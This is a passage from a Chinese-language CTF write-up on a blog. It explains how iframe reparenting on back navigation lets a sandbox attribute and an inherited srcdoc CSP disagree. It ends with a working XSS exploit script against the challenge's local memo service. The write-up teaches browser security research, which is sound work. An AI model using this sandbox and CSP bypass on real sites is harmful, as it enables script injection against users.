+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;\/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">location <span class="token operator">=</span> <span class="token string">'a.html'</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span>
+  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    f<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>
+  <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>測試流程是：</p>
+<ol>
+<li>等待 iframe 載入完畢，會在畫面上看到 test1，此時因為有 sandbox，所以 script 不會執行</li>
+<li>按下 load test2 按鈕，把 sandbox 移除，載入 test2，script 被執行</li>
+<li>按下 top level navigation，把網頁跳去其他地方</li>
+<li>按下瀏覽器上的上一頁</li>
+</ol>
+<p>那按完上一頁之後，預期狀況會是什麼？會根據有沒有 bfcache，出現兩種結果，先看有 bfcache 的。</p>
+<p>如果有 bfcache 的話，按完上一頁就會是剛剛一樣的狀態，可以觀察到：</p>
+<ol>
+<li>console 沒有出現 run，代表 script 不會重新被執行</li>
+<li>iframe 的 src 是 test2</li>
+<li>test2 的隨機數跟剛剛一樣，代表 iframe 中的 script 也沒有重新被執行</li>
+</ol>
+<p>畢竟叫做 bfcache 嘛，所以會完整保留剛剛的狀態，不會重新載入一次網頁。</p>
+<p>那如果沒有 bfcache 呢？照理來說網頁應該要重新載入一次才對，所以預期的狀況會是最剛開始的樣子：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;\/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也就是一個 sandbox 的 iframe 載入 test1。</p>
+<p>但如果實際按下上一頁，會發現結果是既不是一開始的 sandbox + test1，也不是剛才的 no sandbox + test2，而是兩者的混合體：sandbox + test2。</p>
+<p>換句話說，sandbox 屬性維持了頁面最新的狀態，是有的，但是 iframe 的 src 卻不是最新的，而是留在歷史紀錄裡的 test2，兩者結合起來，就變成了 sandbox 的 test2。</p>
+<p>這個「回到上一頁時，iframe 的 src 回到上次的內容」的機制，就叫做 iframe reparenting，似乎沒有對應的 spec 完整描述，而且各個瀏覽器的實作也都不太一樣。</p>
+<p>這個行為大概就是：「我歷史紀錄裡有個被 iframe 載入的 page，現在你按了上一頁，為了增進使用者體驗，我要把這個 page 直接放回到 iframe 中」，但弔詭的是屬性卻不是沿用上次的，而是直接用了當前頁面的。</p>
+<p>如果我們把流程反過來做，就是一種 iframe 的 sandbox bypass：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;\/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">location <span class="token operator">=</span> <span class="token string">'a.html'</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span>
+  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    f<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>
+  <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我們先載入了安全的 test1，並且沒有 sandbox 屬性，接著我們想載入邪惡的 test2，因此加上了 sandbox 屬性，覺得這樣就沒問題了。</p>
+<p>但殊不知如果你把網頁導去其他地方，回到上一頁之後，就會出現沒有 sandbox 的 test2。</p>
+<p>總而言之呢，要記住的是，當你回到上一頁時：</p>
+<ol>
+<li>sandbox 屬性永遠跟著最新的頁面</li>
+<li>src 會是上一次最後載入的網頁</li>
+</ol>
+<h3><span id="3-csp-的繼承">3. CSP 的繼承</span></h3><p>如果是用 iframe src 的話，由於就是嵌入了另一個獨立的網頁，因此兩個網頁之間的 CSP 沒有任何關聯，不會互相影響。但如果是用 srcdoc 的話，就有繼承關係了。</p>
+<p>以底下的程式碼為例：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none'<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Test:&lt;script>document.writeln(Math.random())&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由於有著 <code>script-src &#39;none&#39;</code> 的 CSP，因此頁面上的 script 不會執行，然後 srcdoc 裡的 script 也不會執行，因為通常 iframe srcdoc 的 CSP 會繼承它的 parent，聽起來也很合理。</p>
+<p>那接下來我們來試跟剛剛類似的事情：</p>
+<ol>
+<li>確認頁面上有 CSP</li>
+<li>確認 srcdoc 的 script 無法執行</li>
+<li>按下 top level navigation，去到別的頁面</li>
+<li>更新檔案，把 head 裡的 CSP 刪掉</li>
+<li>按下上一頁</li>
+</ol>
+<p>一樣假設在沒有 bfcache 的狀況下，當我又回到這個網頁時，會是什麼狀況？預期中的行為應該是：「就跟第一次載入一樣」，因此頁面上的 script 跟 srcdoc 裡的 script 都沒有 CSP，都可以執行程式碼。</p>
+<p>但答案是：</p>
+<ol>
+<li>頁面上確實沒有 CSP，所以 script 可以執行，有印出 run</li>
+<li>但是 srcdoc 的 script 卻被 CSP 擋住了，無法執行</li>
+</ol>
+<p>也就是說，此時 iframe srcdoc 的 CSP 並不是繼承於當前頁面，而是繼承於 history 裡的結果，才會發生這種狀況。</p>
+<p>用專有名詞來說的話，叫做 session history 以及 policy container，iframe 的 CSP 來自於 policy container，而這個 policy container 的儲存結果又與 session history 有關，但因為這兩個專有名詞我都沒有深入研究，因此就不多提了。</p>
+<h3><span id="全部加在一起">全部加在一起</span></h3><p>綜合以上的幾點結果，我們知道了幾件事情，當你回到上一頁時：</p>
+<ol>
+<li>sandbox 屬性永遠跟著最新的頁面</li>
+<li>src 會是上一次最後載入的網頁</li>
+<li>srcdoc 的 CSP 會繼承上次的結果</li>
+</ol>
+<p>sandbox 的行為很顯然跟另外兩者不同，就只有它跟著最新的頁面，其他兩個都跟著上次的結果。</p>
+<p>接著回顧一下題目的核心程式碼（檢查 opener 那個我先拿掉了，這樣比較好理解核心概念）：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+  &lt;script>
+  document.head.insertAdjacentHTML(
+    "beforeend",
+    \`&lt;meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
+  );
+  &lt;/script>
+  &lt;iframe srcdoc="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/iframe>
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>第一步，我們先載入一個 sandbox iframe，src 會是我們的 XSS payload：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span>
+
+<span class="token keyword">const</span> xssPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;script>alert(1)&lt;\/script></span><span class="token template-punctuation string">`</span></span>
+<span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe sandbox="allow-same-origin" src="/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>xssPayload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token template-punctuation string">`</span></span>
+<span class="token keyword">const</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此時這個 win 的內容就會是：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>
+    &lt;iframe
+      sandbox="allow-same-origin"
+      src="/memo?memo=&lt;script>alert(1)&lt;/script>">
+    &lt;/iframe>
+  <span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果更放大一點來看那個 sandbox iframe 的話，這個 iframe 裡面的內容是：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!-- 空的 head，沒有 CSP --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>alert(1)&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>由於 sandbox 的緣故，因此 script 不會執行，所以不會有 CSP。但也因為 sandbox，所以 srcdoc 裡的 script 也同樣不會執行。</p>
+<p>接著我們把網頁跳到其他頁面，然後開啟 <code>/memo?memo=&lt;iframe&gt;&lt;/iframe&gt;</code>，這時候 cookie 中的內容會被取代掉。</p>
+<p>再利用 <code>history.back()</code> 回去，此時如同前面所講的，網頁會重新載入，因此網頁的 HTML 變成：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>
+        &lt;iframe>&lt;/iframe>
+    <span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>雖然看起來是空的，但因為之前講過的 reparenting 行為，因此那個空的 iframe 的內容，會是上次的 <code>/memo?memo=&lt;script&gt;alert(1)&lt;/script&gt;</code>。</p>
+<p>接著，又因為之前講過的：「sandbox 屬性永遠跟著現在的頁面」的特性，現在這個 iframe 的 sandbox 沒了。既然 sandbox 沒了，那內容就變成：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>alert(1)&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>原本 CSP 是空的，但因為 sandbox 不見了，所以現在又回來了。</p>
+<p>但是呢，最後也是最重要的一點，前面提過的：「srcdoc 的 CSP 會繼承上次的結果」，因此這個 srcdoc 的 CSP 與當前頁面無關，而是繼承上次的，而上次的 CSP 是什麼？是空的，因此 script 就可以執行了，順利達成 XSS。</p>
+<p>把題目的 opener 檢查拿掉之後，exploit 會簡單很多，比較好理解：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  <span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span>
+
+  <span class="token keyword">const</span> xssPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;script>alert(document.domain)&lt;\/script></span><span class="token template-punctuation string">`</span></span>
+  <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe sandbox="allow-same-origin" src="/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>xssPayload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token template-punctuation string">`</span></span>
+  <span class="token keyword">const</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+
+  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> win2 <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=&lt;iframe>&lt;/iframe></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      win2<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+      win<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+        &lt;script>
+          setTimeout(() => &#123;
+           history.back();
+          &#125;, 500);
+        &lt;\/script>
+      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"text/html"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>以上就是這題的解法，主要是靠著回到上一頁時，載入 sandbox 與 CSP 兩者的來源不同，藉此創造出差異，達成 XSS。</p>
+<h2><span id="總結">總結</span></h2><p>根據作者的說法，這一題的靈感來源是這個 issue：<a target="_blank" rel="noopener" href="https://github.com/whatwg/html/issues/6809">srcdoc and sandbox interaction with session history #6809</a>，而寫這篇的時候我也是看了這個 issue 好幾遍，自己做實驗很多次，才終於搞懂箇中奧妙，重點是看完之後要自己動手試試看，多試幾次大概就會知道是怎麼一回事了。</p>
+<p>話說這個 issue 的作者 Jake Archibald，就是 <a target="_blank" rel="noopener" href="https://www.youtube.com/playlist?list=PLNYkxOF6rcIAKIQFsNbV0JDws_G_bnNo9">HTTP 203</a> 的主持人，這個節目對前端工程師來說應該不陌生，會講到很多與 Web 相關的議題，而有篇前端工程師的必讀經典之一：<a target="_blank" rel="noopener" href="https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/">Tasks, microtasks, queues and schedules</a> 也是他寫的。</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2024/06/28/google-ctf-2024-writeup/">GoogleCTF 2024 筆記</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2024 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2024/09/07/en/idek-ctf-2024-iframe/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
